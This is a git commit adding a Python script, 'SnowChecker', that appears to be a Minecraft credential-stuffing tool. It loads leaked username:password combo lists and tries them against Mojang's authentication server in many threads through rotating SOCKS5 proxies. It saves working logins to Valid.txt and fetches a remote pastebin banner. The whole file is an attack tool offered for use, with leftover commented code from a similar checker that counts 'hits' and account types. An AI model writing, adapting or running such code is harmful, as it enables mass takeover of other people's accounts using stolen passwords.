d5c2b67b8279ed762ddb27a79496b16ffab8c4a9
Starlysh <74881934+YuuKomoe@users.noreply.github.com>
2021-11-16 14:06:46 +0100

    Source

---
+++ ack.py
@@ -0,0 +1,210 @@
+from colorama import Fore, init, Style
+from requests import Session, exceptions
+from traceback import format_exc
+from easygui import fileopenbox
+
+import threading, requests
+import ctypes, time, os
+import random
+
+yellow = Fore.LIGHTYELLOW_EX
+red = Fore.LIGHTRED_EX
+green = Fore.LIGHTGREEN_EX
+cyan = Fore.LIGHTCYAN_EX
+blue = Fore.LIGHTBLUE_EX
+white = Fore.LIGHTWHITE_EX
+magenta = Fore.LIGHTMAGENTA_EX
+
+version = "0.2"
+mark = f'{white}\n' + requests.get("https://pastebin.com/raw/jHQh1YYm").text + f"\n\n{magenta}  SnowChecker-{version} »» by Starlysh & Devs Team \n"
+
+class Main:
+    def __init__(self):
+        self.checking = True
+        self.usernames = []
+        self.passwords = []
+        self.proxy_list = []
+        self.invalid = 0
+        self.counter = 0
+        self.valid = 0
+
+    def load_proxies(self):
+        print(mark)
+        if os.path.exists("proxies.txt"):
+            try:
+                with open("proxies.txt", 'r+', encoding='utf-8', errors='ignore') as e:
+                    ext = e.readlines()
+                    for line in ext:
+                        try:
+                            proxyline = line.split()[0].replace('\n', '')
+                            self.proxy_list.append(proxyline)
+                        except:
+                            pass
+                print(f"> Loaded [{len(self.proxy_list)}] proxies lines..\n")
+            except Exception:
+                print("proxy error")
+
+    def load_combos(self):
+        if os.path.exists("combo.txt"):
+            with open("combo.txt", "r") as f:
+                for line in f.read().splitlines():
+                    if ":" in line:
+                        self.usernames.append(line.split(":")[0])
+                        self.passwords.append(line.split(":")[-1])
+            if not len(self.usernames): return None
+            return True
+        print(mark)
+        os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("Minecraft Account Checker | Error"); 
+        print(f'{yellow}ERROR{white} : No combo file found: \'combo.txt\'');
+        combo = loader = open(fileopenbox(title="Load Combo List", default="*.txt"), 'r', encoding="utf8", errors='ignore').read().split('\n') 
+        exit()
+    
+    def title(self):
+        ctypes.windll.kernel32.SetConsoleTitleW("Minecraft Account Checker | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid))))
+       
+    def session(self):
+        session = requests.Session()
+        session.trust_env = False
+        return session
+    
+    def check_account(self, username, password):
+        try:
+            for uwu in range(self.retries):
+                session = self.session()
+                proxy = random.choice(self.proxy_list)
+                json = {"agent": {"name": "Minecraft", "version": "1"}, "clientToken": None, "password": password, "requestUser": "true", "username": username}
+                check = session.post("https://authserver.mojang.com/authenticate", json = json, headers = {"User-Agent": "MinecraftLauncher/1.0"}, proxies = dict(
+                    http="socks5://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":1080",
+                    https="socks5://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":1080"
+                ))
+                
+                # print(check.json())
+
+                if "accessToken" in check.json():
+                    print(f'{green}[Good] {white}{username}:{password}')
+                elif "error" in check.json():
+                    print(f'{red}[Bad] {white}{username}:{password}')
+                elif "in" in check.json():
+                    print(f'{yellow}[Rate Limited] {white}{username}:{password}')
+                elif "The request could not be satisfied." in check.content:
+                    self.proxy_list.remove(proxy)
+            
+            if "clientToken" in check.text:
+                with open("Valid.txt", "a") as f: f.write("{}:{}\n".format(username, password))
+                self.valid += 1
+                self.title()
+            else:
+                self.invalid += 1
+                self.title()
+        except Exception:
+            pass
+
+    def start_checking(self):
+        def thread_starter():
+            self.check_account(self.usernames[self.counter], self.passwords[self.counter])
+
+        while True:
+            if threading.active_count() <= self.threads:
+                threading.Thread(target = thread_starter).start()
+                self.counter += 1
+            
+            if self.counter >= len(self.usernames): break
+        input()
+
+    def main(self):
+        os.system("cls")
+        load_combo = self.load_combos()
+        if load_combo is not None:
+            print(mark)
+            self.threads = int(input(f'{blue}> {white}Threads: '))
+            os.system("cls")
+            print(mark)
+            self.retries = int(input(f'{blue}> {white}Retries (1 = default, 3 max): '))
+            os.system("cls")
+            self.load_proxies()
+            self.start_checking()
+        else:
+            os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("Minecraft Account Checker | Error"); 
+            print(f'{yellow}ERROR{white} : Please put your combos inside of \'combo.txt\''); time.sleep(10); 
+            exit()
+        
+#    def getannounces(self):
+#        try:
+#            announcement = session.get(
+#                'https://raw.githubusercontent.com/ShadowOxygen/OxygenX/master/announcement').text.split("Color: ")
+#            color = announcement[1].lower()
+#            if color == 'red\n':
+#                color = red
+#            elif color == 'white\n':
+#                color = white
+#            elif color == 'blue\n':
+#                color = blue
+#            elif color == 'green\n':
+#                color = green
+#            elif color == 'cyan\n':
+#                color = cyan
+#            elif color == 'magenta\n':
+#                color = magenta
+#            elif color == 'yellow\n':
+#                color = yellow
+#            self.announcement = f"{color}{announcement[0]}"
+#        except:
+#            if SnowChecker.debug:
+#                print(f'{yellow}ERROR {white}while displaying announcement: \n{format_exc(limit=1)}\n')
+#            return
+
+
+#    def start_checker(self):
+#        if OxygenX.threads > len(self.accounts):
+#            OxygenX.threads = int(len(self.accounts))
+#        self.get_announcement()
+#        mainpool = ThreadPool(processes=OxygenX.threads)
+#        clear()
+#        print(t)
+#        print(self.announcement)
+#        self.start_time = time()
+#        Thread(target=self.title).start()
+#        mainpool.imap_unordered(func=self.prep, iterable=self.accounts)
+#        mainpool.close()
+#        mainpool.join()
+#        symbo = f'[{Fore.GREEN}>{white}]'
+#        cyanz = f'[{Fore.CYAN}>{white}]'
+#        result = f'{white}\n\n[{Fore.YELLOW}>{white}] Results: \n\n' \
+#            f'[{green}+{white}] Hits: {Counter.hits}\n' \
+#            f'[{red}-{white}] Bad: {Counter.bad}{white}\n\n' \
+#            f'[{green}>{white}] NFA: {Counter.nfa}\n' \
+#            f'{cyanz} SFA: {Counter.sfa}\n' \
+#            f'[{blue}>{white}] MFA: {Counter.mfa}\n' \
+#            f'[{magenta}>{white}] Unmigrated: {Counter.unfa}\n\n' \
+#            f'{symbo} Mojang capes: {Counter.mojang}\n' \
+#            f'{symbo} Optifine capes: {Counter.optifine}\n' \
+#            f'{cyanz} Speed: {cyan}{round(Counter.checked / (time() - self.start_time), 2)} accounts/s\n' \
+#            f'{white}{cyanz} Total time checking: {cyan}{self.now_time()}\n\n' \
+#            f'[{magenta}x{white}] Finish checking..\n'
+#        self.stop_time = False
+#        print(result)
+
+
+# def updatechecks():
+#    try:
+#        gitversion = session.get(
+#            "https://github.com/").text
+#        if f'{version}\n' != gitversion:
+#            print(t)
+#            print(f"{red}Your program is outdated.")
+#            print(f"Your version: {version}\n")
+#            print(f'Latest version: {gitversion}Get latest version in the link below')
+#            print(f"https://github.com/ \n Starting in 5 seconds...{cyan}")
+#            sleep(5)
+#            clear()
+#    except:
+#        if SnowChecker.debug:
+#            print(f"{red} Error while checking for updates: \n{format_exc(limit=1)}\n")
+
+Main().main()
+
+if __name__ == '__main__':
+    session = Session()    
+    # if SnowChecker.version_check:
+    #     checkforupdates()
+Main()
